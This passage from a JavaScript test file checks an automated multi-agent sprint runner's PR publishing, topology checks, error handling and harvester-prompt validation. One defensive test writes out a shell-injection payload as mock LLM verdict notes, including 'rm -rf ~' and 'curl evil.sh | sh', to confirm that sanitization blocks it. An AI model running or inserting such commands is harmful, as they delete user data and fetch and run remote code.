        !(bdJsonNoiseError instanceof SyntaxError),
        `Expected a diagnostic Error, not a bare SyntaxError, got: ${bdJsonNoiseError ? bdJsonNoiseError.constructor.name : 'n/a'}`
    );
    check(
        bdJsonNoiseError && bdJsonNoiseError.message.includes("bd list --parent bd-1 --ready --json"),
        `Expected the diagnostic error to name the offending command, got: ${bdJsonNoiseError ? bdJsonNoiseError.message : 'n/a'}`
    );
    check(
        bdJsonNoiseError && bdJsonNoiseError.message.includes('WARN: some deprecation notice'),
        `Expected the diagnostic error to include a raw-output snippet, got: ${bdJsonNoiseError ? bdJsonNoiseError.message : 'n/a'}`
    );

    // =========================================================================
    // apra-fleet-unw2.4 (N4): the multi-member topology precondition
    // (checkMemberTopology, the pure helper bin/cli.mjs wires to
    // `git rev-parse HEAD` per member) refuses to start when the members'
    // identity signals disagree, and trivially passes for a single member.
    // =========================================================================
    console.log('Running topology precondition checks (checkMemberTopology)...');
    // Single member -> trivially ok, and getIdentity must not even be called.
    const topoSingle = await checkMemberTopology({
        members: ['solo'],
        getIdentity: async () => { throw new Error('getIdentity must not be called for a single-member sprint'); },
    });
    check(topoSingle.ok && topoSingle.singleMember, `Single-member topology must trivially pass, got: ${JSON.stringify(topoSingle)}`);

    // Agreeing signals (shared workspace) -> ok, not flagged single-member.
    const topoAgree = await checkMemberTopology({ members: ['m1', 'm2'], getIdentity: async () => 'deadbeef\n' });
    check(topoAgree.ok && !topoAgree.singleMember, `Members sharing an identity signal must pass, got: ${JSON.stringify(topoAgree)}`);

    // Disagreeing signals (separate checkouts) -> REFUSE with a clear message
    // that names both members and the divergent signals.
    const topoMismatch = await checkMemberTopology({
        members: ['m1', 'm2'],
        getIdentity: async (m) => (m === 'm1' ? 'aaaaaaa' : 'bbbbbbb'),
    });
    check(!topoMismatch.ok, 'Topology check MUST refuse to start when member identity signals disagree');
    check(
        /refus/i.test(topoMismatch.message) && topoMismatch.message.includes('m1') && topoMismatch.message.includes('m2') &&
        topoMismatch.message.includes('aaaaaaa') && topoMismatch.message.includes('bbbbbbb'),
        `Topology mismatch message must clearly refuse and name the divergent members/signals, got: ${topoMismatch.message}`
    );

    // A member whose signal cannot be obtained -> REFUSE (cannot verify shared
    // state), naming the failing member and the reason.
    const topoErr = await checkMemberTopology({
        members: ['m1', 'm2'],
        getIdentity: async (m) => { if (m === 'm2') throw new Error('not a git repository'); return 'aaaaaaa'; },
    });
    check(!topoErr.ok, 'Topology check MUST refuse when a member identity signal cannot be obtained');
    check(
        topoErr.message.includes('m2') && /not a git repository/.test(topoErr.message),
        `Topology unresolved-signal message must name the failing member and reason, got: ${topoErr.message}`
    );

    // =========================================================================
    // apra-fleet-unw2.9 (N11) acceptance criterion 1: re-running finalization
    // against the SAME branch (simulating a re-run of a sprint that already
    // published a PR) must NOT throw. `prExistsState` is a Set shared across
    // both scenario runs and `branchOverride` pins both runs to the exact
    // same branch name -- the second run's `gh pr create` sees that branch
    // already recorded and mock-fails with an "already exists" message,
    // which runner.js's Publish PR step must swallow (not throw).
    // =========================================================================
    console.log('Running mock sprint scenario (idempotent PR creation: re-run same branch)...');
    const idempotentPrState = new Set();
    const idempotentBranch = 'auto-sprint/mock-idempotent-pr-rerun';
    const idemPrRun1 = await runDevelopLoopScenario('idempr1', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Idempotent PR creation run 1' }],
        maxCycles: 1,
        prExistsState: idempotentPrState,
        branchOverride: idempotentBranch,
    });
    check(!idemPrRun1.error, `Idempotent-PR run1 (first publish, no prior PR) should not throw: ${idemPrRun1.error ? idemPrRun1.error.message : ''}`);
    check(
        idemPrRun1.result && idemPrRun1.result.status === 'success',
        `Idempotent-PR run1 should succeed, got: ${JSON.stringify(idemPrRun1.result)}`
    );
    check(
        idemPrRun1.commandLog.some((c) => c.startsWith('gh pr create') && c.includes(`--head "${idempotentBranch}"`)),
        `Expected run1 to dispatch 'gh pr create' for '${idempotentBranch}', commandLog: ${JSON.stringify(idemPrRun1.commandLog)}`
    );

    const idemPrRun2 = await runDevelopLoopScenario('idempr2', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: Idempotent PR creation run 2 (re-run)' }],
        maxCycles: 1,
        prExistsState: idempotentPrState,
        branchOverride: idempotentBranch,
    });
    check(
        !idemPrRun2.error,
        `SECOND run against the same branch (simulating a re-run) must NOT throw in finalization, got error: ${idemPrRun2.error ? `${idemPrRun2.error.constructor.name}: ${idemPrRun2.error.message}` : ''}`
    );
    check(
        idemPrRun2.result && idemPrRun2.result.status === 'success',
        `Idempotent-PR run2 (re-run against a branch with an existing PR) should still resolve to success, got: ${JSON.stringify(idemPrRun2.result)}`
    );
    check(
        idemPrRun2.commandLog.some((c) => c.startsWith('gh pr create') && c.includes(`--head "${idempotentBranch}"`)),
        `Expected run2 to still dispatch 'gh pr create' (idempotently) for '${idempotentBranch}', commandLog: ${JSON.stringify(idemPrRun2.commandLog)}`
    );
    check(
        idemPrRun2.logs.some((m) => m.includes('already exists') && m.includes('idempotent success')),
        `Expected a logged message noting the PR already exists and was treated as an idempotent success, logs: ${JSON.stringify(idemPrRun2.logs)}`
    );

    // =========================================================================
    // apra-fleet-unw2.9 (N11) acceptance criterion 2: the PR title/body must
    // include the final verdict, for both PASS and FAIL outcomes. Per
    // plan.md's already-decided rule (not re-litigated here), a FAIL verdict
    // still publishes the PR -- the verdict is stated plainly in the body,
    // not suppressed.
    // =========================================================================
    console.log('Running mock sprint scenario (PR title/body carries PASS verdict)...');
    const prVerdictPass = await runDevelopLoopScenario('prverdictpass', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: PR verdict PASS scenario' }],
        maxCycles: 1,
    });
    check(!prVerdictPass.error, `PR-verdict PASS scenario should not throw: ${prVerdictPass.error ? prVerdictPass.error.message : ''}`);
    check(prVerdictPass.result && prVerdictPass.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prVerdictPass.result)}`);
    const prVerdictPassCmd = prVerdictPass.commandLog.find((c) => c.startsWith('gh pr create'));
    check(!!prVerdictPassCmd, `Expected a 'gh pr create' command in the log, commandLog: ${JSON.stringify(prVerdictPass.commandLog)}`);
    check(
        !!prVerdictPassCmd && /--title "[^"]*PASS[^"]*"/.test(prVerdictPassCmd) && /--body "[^"]*PASS[^"]*"/.test(prVerdictPassCmd),
        `Expected the PR title AND body to include the PASS verdict, got: ${prVerdictPassCmd}`
    );

    console.log('Running mock sprint scenario (PR title/body carries FAIL verdict, PR still published)...');
    const prVerdictFail = await runDevelopLoopScenario('prverdictfail', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: PR verdict FAIL scenario' }],
        maxCycles: 1,
        finalReviewHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'FAIL', notes: 'Injected FAIL for PR-verdict test.' }) }]
        }),
    });
    check(!prVerdictFail.error, `PR-verdict FAIL scenario should not throw: ${prVerdictFail.error ? prVerdictFail.error.message : ''}`);
    check(prVerdictFail.result && prVerdictFail.result.verdict === 'FAIL', `Expected a FAIL final verdict, got: ${JSON.stringify(prVerdictFail.result)}`);
    const prVerdictFailCmd = prVerdictFail.commandLog.find((c) => c.startsWith('gh pr create'));
    check(
        !!prVerdictFailCmd,
        `A FAIL verdict must still publish the PR (plan.md's already-made decision) -- expected a 'gh pr create' command, commandLog: ${JSON.stringify(prVerdictFail.commandLog)}`
    );
    check(
        !!prVerdictFailCmd && /--title "[^"]*FAIL[^"]*"/.test(prVerdictFailCmd) && /--body "[^"]*FAIL[^"]*"/.test(prVerdictFailCmd),
        `Expected the PR title AND body to include the FAIL verdict, got: ${prVerdictFailCmd}`
    );

    // =========================================================================
    // apra-fleet-hfs: the final reviewer's verdict `notes` are LLM-authored
    // free text (same as N3's reviewer newTasks) and get embedded in the PR
    // title/body string that the Publish PR step interpolates into a
    // double-quoted `gh pr create --title "..." --body "..."` command()
    // string. A verdict notes payload containing shell metacharacters
    // (double quotes, backticks, $(...), semicolons) must never let anything
    // dangerous reach the dispatched command() string, and the PR must still
    // be published with the (sanitized, still-readable) notes text visible
    // -- unlike N3's newTasks, a malformed verdict cannot simply be dropped,
    // since the verdict is the one thing a human reviewer most needs to see.
    // =========================================================================
    console.log('Running mock sprint scenario (adversarial verdict notes cannot inject into gh pr create)...');
    const adversarialNotes = 'Looks fine" ; rm -rf ~ ; echo "pwned $(curl evil.sh | sh) `whoami` trailing\\';
    const prInjection = await runDevelopLoopScenario('prinjection', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: PR notes injection scenario' }],
        maxCycles: 1,
        finalReviewHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'PASS', notes: adversarialNotes }) }]
        }),
    });
    check(!prInjection.error, `PR-notes injection scenario should not throw: ${prInjection.error ? prInjection.error.message : ''}`);
    check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
    const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('gh pr create'));
    check(!!prInjectionCmd, `Expected a 'gh pr create' command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
    for (const cmd of prInjection.commandLog) {
        // The raw payload's dangerous shell-metacharacter SEQUENCES must
        // never survive into a dispatched command() string -- '$(' (command
        // substitution), a backtick (command substitution), and a raw '"'
        // that could close --body's quoting early. Plain English words that
        // happen to also appear in the payload (e.g. "rm", "pwned") are NOT
        // themselves dangerous once the syntax around them is stripped, and
        // sanitizePrText() is explicitly designed to keep them readable
        // rather than dropping the notes outright -- so this only asserts
        // on the SHELL-SYNTAX characters, not on payload vocabulary.
        check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
        check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
    }
    // The command() string itself must remain well-formed: exactly two
    // double-quoted arguments for --title/--body, i.e. the sanitized notes
    // never introduce (or leave behind) a stray '"' that would prematurely
    // close --body's quoting.
    check(
        !!prInjectionCmd && (prInjectionCmd.match(/"/g) || []).length % 2 === 0,
        `Expected an even number of double-quotes in the dispatched gh pr create command (no unbalanced quote from unsanitized notes), got: ${prInjectionCmd}`
    );
    // The sanitized notes must still be visible/readable in the PR body --
    // sanitizePrText() strips shell metacharacters but preserves the rest of
    // the text (words, punctuation) rather than rejecting the verdict
    // outright (unlike N3's validateNewTask(), a verdict cannot simply be
    // dropped). Compute the exact expected sanitized text via the same
    // sanitizePrText() runner.js itself uses, so this test tracks the real
    // implementation rather than a hand-duplicated regex.
    const expectedSanitizedNotes = sanitizePrText(adversarialNotes);
    check(
        expectedSanitizedNotes.length > 0 && !/["`$\\]/.test(expectedSanitizedNotes),
        `Expected sanitizePrText() to strip all shell metacharacters while leaving readable text, got: ${JSON.stringify(expectedSanitizedNotes)}`
    );
    check(
        !!prInjectionCmd && prInjectionCmd.includes(`Notes: ${expectedSanitizedNotes}`),
        `Expected the sanitized (but still readable) notes text to be visible in the PR body, got: ${prInjectionCmd}`
    );

    // =========================================================================
    // apra-fleet-unw2.9 (N11) acceptance criterion 3: an injected git/gh
    // failure (other than "already exists") must surface as a clear, typed
    // error -- never swallowed/invisible.
    // =========================================================================
    console.log('Running mock sprint scenario (injected gh pr create failure surfaces as a typed error)...');
    const ghFailure = await runDevelopLoopScenario('ghfailure', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: gh failure injection scenario' }],
        maxCycles: 1,
        gitGhFailurePattern: /^gh pr create\b/,
        gitGhFailureMessage: 'error connecting to api.github.com: authentication failed',
    });
    check(!!ghFailure.error, 'Expected the injected gh pr create failure to surface as a thrown error, not be swallowed');
    check(
        ghFailure.error instanceof CommandError,
        `Expected the surfaced error to be a typed CommandError, got: ${ghFailure.error ? ghFailure.error.constructor.name : 'n/a'}`
    );
    check(
        !!ghFailure.error && ghFailure.error.message.includes('authentication failed'),
        `Expected the surfaced error to include the underlying gh failure text, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
    );
    check(
        !!ghFailure.error && /already exists/i.test(ghFailure.error.message) === false,
        `A non-"already exists" gh failure must not be misclassified/swallowed as the idempotent case, got: ${ghFailure.error ? ghFailure.error.message : 'n/a'}`
    );

    // Sanity: also inject a plain `git push` failure and confirm it, too,
    // surfaces as a typed error (Publish PR's push step is not failSoft).
    console.log('Running mock sprint scenario (injected git push failure surfaces as a typed error)...');
    const gitPushFailure = await runDevelopLoopScenario('gitpushfailure', {
        members: ['local'],
        taskSpecs: [{ title: 'Task: git push failure injection scenario' }],
        maxCycles: 1,
        gitGhFailurePattern: /^git push\b/,
        gitGhFailureMessage: 'fatal: unable to access remote: Could not resolve host',
    });
    check(!!gitPushFailure.error, 'Expected the injected git push failure to surface as a thrown error, not be swallowed');
    check(
        gitPushFailure.error instanceof CommandError,
        `Expected the surfaced git-push error to be a typed CommandError, got: ${gitPushFailure.error ? gitPushFailure.error.constructor.name : 'n/a'}`
    );
    check(
        !!gitPushFailure.error && gitPushFailure.error.message.includes('Could not resolve host'),
        `Expected the surfaced error to include the underlying git failure text, got: ${gitPushFailure.error ? gitPushFailure.error.message : 'n/a'}`
    );

    // =========================================================================
    // apra-fleet-unw2.22 (N12 follow-up) regression 1: the harvester
    // contract check must genuinely fail when analysisText/costAnalysis/
    // analysisArtifactFile are blank, not merely check for the STATIC
    // instructional label text buildHarvesterPrompt() always emits. This
    // is a scratch-edit-and-revert proof against the REAL, exported
    // buildHarvesterPrompt() from runner.js (not a hand-rolled
    // reimplementation of its format in the test) -- mirroring how the
    // original finding proved the pre-fix regex was weak by forcing
    // costAnalysis = '' in runner.js and observing the mock still reported
    // OK.
    // =========================================================================
    console.log('Running harvester-contract-check hardening regression (blank analysisText/costAnalysis/analysisArtifactFile)...');
    const realArgs = {
        branch: 'auto-sprint/regression-check',
        baseBranch: 'main',
        targetIssues: ['bd-1'],
        analysisArtifactFile: 'docs/sprint-analysis-auto-sprint-regression-check-deadbeef.md',
        analysisText: '# Sprint Analysis: auto-sprint/regression-check\n\nCycles run: 3.\n\nFinal verdict: PASS.',
        costAnalysis: 'Budget ceiling: $5.0000. Tracked spend: $1.2500. Remaining budget: $3.7500.',
    };

    // "Revert" case first (real, non-trivial content): the hardened check
    // must still pass a genuinely well-formed prompt.
    const realPrompt = buildHarvesterPrompt(realArgs);
    check(
        checkHarvesterContract(realPrompt).length === 0,
        `Hardened harvester contract check must PASS a real, non-blank prompt, got missing: ${JSON.stringify(checkHarvesterContract(realPrompt))}`
    );

    // Scratch-edit: force costAnalysis blank, as the original finding did
    // directly in runner.js. Everything else stays real/non-trivial.
    const blankCostAnalysis = buildHarvesterPrompt({ ...realArgs, costAnalysis: '' });
    const blankCostAnalysisMissing = checkHarvesterContract(blankCostAnalysis);
    check(
        blankCostAnalysisMissing.includes('costAnalysis'),
        `Hardened harvester contract check must report 'costAnalysis' as missing when runner.js emits a blank costAnalysis, got: ${JSON.stringify(blankCostAnalysisMissing)}`
    );

    // Scratch-edit: force analysisText blank.
    const blankAnalysisText = buildHarvesterPrompt({ ...realArgs, analysisText: '' });
    const blankAnalysisTextMissing = checkHarvesterContract(blankAnalysisText);
    check(
        blankAnalysisTextMissing.includes('analysisText'),
        `Hardened harvester contract check must report 'analysisText' as missing when runner.js emits a blank analysisText, got: ${JSON.stringify(blankAnalysisTextMissing)}`
    );

    // Scratch-edit: force a near-blank (whitespace-only) analysisText --
    // proves the check is a real content-length assertion, not just a
    // non-empty-string check.
    const whitespaceOnlyAnalysisText = buildHarvesterPrompt({ ...realArgs, analysisText: '   \n  ' });
    const whitespaceOnlyMissing = checkHarvesterContract(whitespaceOnlyAnalysisText);
    check(
        whitespaceOnlyMissing.includes('analysisText'),
        `Hardened harvester contract check must report 'analysisText' as missing when it is whitespace-only, got: ${JSON.stringify(whitespaceOnlyMissing)}`
    );

    // Scratch-edit: force analysisArtifactFile blank. This specifically
    // regression-tests the unanchored-\s* bug: the pre-fix regex
    // (/analysisArtifactFile:\s*\S+/) would skip over the blank value AND
    // the following blank-line paragraph break, matching into the next
    // paragraph's "analysisText" word instead -- silently passing.
    const blankArtifactFile = buildHarvesterPrompt({ ...realArgs, analysisArtifactFile: '' });
    const blankArtifactFileMissing = checkHarvesterContract(blankArtifactFile);
    check(
        blankArtifactFileMissing.includes('analysisArtifactFile'),
        `Hardened harvester contract check must report 'analysisArtifactFile' as missing when runner.js emits a blank analysisArtifactFile (regression test for the unanchored \\s* bug), got: ${JSON.stringify(blankArtifactFileMissing)}`
    );

    // "Revert": build the prompt again with everything real -- confirms the
    // hardened check passes again once the values are restored, exactly
    // like the scratch-edit-and-revert methodology used to prove the
    // original bug.
    const revertedPrompt = buildHarvesterPrompt(realArgs);
    check(
        checkHarvesterContract(revertedPrompt).length === 0,
        `Hardened harvester contract check must PASS again once all inputs are reverted to real content, got missing: ${JSON.stringify(checkHarvesterContract(revertedPrompt))}`
    );

    // Also confirm the LIVE mock (buildMockFleetApi's 'harvester' branch, as
    // actually wired into a real sprint dispatch) reports FAILED -- not
    // OK -- for a blank costAnalysis. This is the literal "mock now reports
    // FAILED" acceptance criterion, driven through buildMockFleetApi rather
    // than the checkHarvesterContract() helper directly.
    {
        const regressionTempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'apra-fleet-harvester-regression-'));
        try {
            const dispatched = [];
            const mockFleetApi = buildMockFleetApi(regressionTempDir, { id: 'bd-1' }, dispatched, []);
            const harvesterResult = await mockFleetApi.executePrompt({ agent: 'harvester', label: 'Harvest', prompt: blankCostAnalysis });
            const parsed = JSON.parse(harvesterResult.content[0].text);
            check(
                parsed.status === 'FAILED',
                `Expected the live mock's harvester branch to report status FAILED for a blank costAnalysis, got: ${JSON.stringify(parsed)}`
            );
            check(
                typeof parsed.notes === 'string' && parsed.notes.includes('costAnalysis'),
                `Expected the live mock's FAILED notes to name costAnalysis as the missing input, got: ${JSON.stringify(parsed)}`
            );

            // "Revert": the same live mock must report OK for the real,
            // non-blank prompt.
            const okResult = await mockFleetApi.executePrompt({ agent: 'harvester', label: 'Harvest', prompt: realPrompt });
            const okParsed = JSON.parse(okResult.content[0].text);
            check(
                okParsed.status === 'OK',
                `Expected the live mock's harvester branch to report status OK once reverted to a real, non-blank prompt, got: ${JSON.stringify(okParsed)}`
            );
        } finally {
            await teardown(regressionTempDir);
        }
    }

    // =========================================================================
    // apra-fleet-unw2.22 (N12 follow-up) regression 2: computeBranchSlug()
    // must disambiguate branch names that collide under a naive
    // slash-to-hyphen replacement, e.g. `feat/fleet-reorg` (which naively
    // slugs to `feat-fleet-reorg`) vs. the literal branch name
    // `feat-fleet-reorg` (which naively slugs to itself, identically).
    // =========================================================================
    console.log('Running branchSlug collision-disambiguation regression (computeBranchSlug)...');
    const collidingBranchA = 'feat/fleet-reorg';
    const collidingBranchB = 'feat-fleet-reorg';
    const naiveSlugA = collidingBranchA.replace(/[\\/]+/g, '-');
    const naiveSlugB = collidingBranchB.replace(/[\\/]+/g, '-');
    check(
        naiveSlugA === naiveSlugB,
        `Test premise broken: expected '${collidingBranchA}' and '${collidingBranchB}' to collide under a naive slash-to-hyphen replacement (both -> '${naiveSlugA}'/'${naiveSlugB}')`
    );
    const slugA = computeBranchSlug(collidingBranchA);
    const slugB = computeBranchSlug(collidingBranchB);
    check(
        slugA !== slugB,
        `computeBranchSlug() must disambiguate colliding branch names, got identical slugs for '${collidingBranchA}' and '${collidingBranchB}': '${slugA}'`
    );
    check(
        `docs/sprint-analysis-${slugA}.md` !== `docs/sprint-analysis-${slugB}.md`,
        `The two colliding branches must now produce two different analysisArtifactFile paths, got identical: docs/sprint-analysis-${slugA}.md`
    );
    // Determinism: the same branch name must always produce the same slug
    // (required for idempotent re-runs and the golden-transcript test).
    check(
        computeBranchSlug(collidingBranchA) === computeBranchSlug(collidingBranchA),
        'computeBranchSlug() must be deterministic for the same input branch name'
    );
    // Human-readable prefix is preserved (debuggability -- the slug should
    // still be recognizable, not just an opaque hash).
    check(
        slugA.startsWith(naiveSlugA + '-') && slugB.startsWith(naiveSlugB + '-'),
        `Expected computeBranchSlug() to preserve the human-readable slash-to-hyphen prefix ahead of the disambiguating suffix, got slugA='${slugA}' slugB='${slugB}'`
    );

    if (failures.length > 0) {
        console.error('\nFAIL advanced-mock-runner-test.mjs:');
        for (const f of failures) console.error(' - ' + f);
        process.exitCode = 1;
    } else {
        console.log('\nPASS advanced-mock-runner-test.mjs: deterministic across 2 runs, all runner.js phases exercised.');
        process.exitCode = 0;
    }
}

main().catch((err) => {
    console.error('advanced-mock-runner-test.mjs crashed:', err);
    process.exitCode = 1;
});
